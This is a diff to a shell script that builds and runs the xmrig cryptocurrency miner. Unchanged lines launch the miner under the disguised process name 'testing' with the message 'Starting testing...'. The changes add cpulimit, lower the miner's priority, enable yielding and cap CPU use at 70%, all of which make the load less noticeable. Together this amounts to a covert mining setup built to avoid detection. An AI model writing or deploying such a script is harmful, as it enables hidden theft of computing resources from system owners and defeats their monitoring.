@@ -4,7 +4,7 @@ set -e
 
 echo "[1] Update & install dependencies..."
 sudo apt update
-sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen net-tools
+sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen net-tools cpulimit
 
 echo "[2] Clone xmrig..."
 git clone https://github.com/xmrig/xmrig.git || true
@@ -55,10 +55,10 @@ cat > config.json << 'EOF'
     "cpu": {
         "enabled": true,
         "huge-pages": true,
-        "priority": 5,
-        "yield": false,
+        "priority": 3,
+        "yield": true,
         "asm": true,
-        "max-threads-hint": 100
+        "max-threads-hint": 70
     },
 
     "opencl": {
@@ -92,7 +92,7 @@ while true
 do
     echo "Starting testing..."
 
-    exec -a testing ./xmrig &
+    exec -a testing cpulimit -l 70 -- ./xmrig &
 
     PID=$!
 
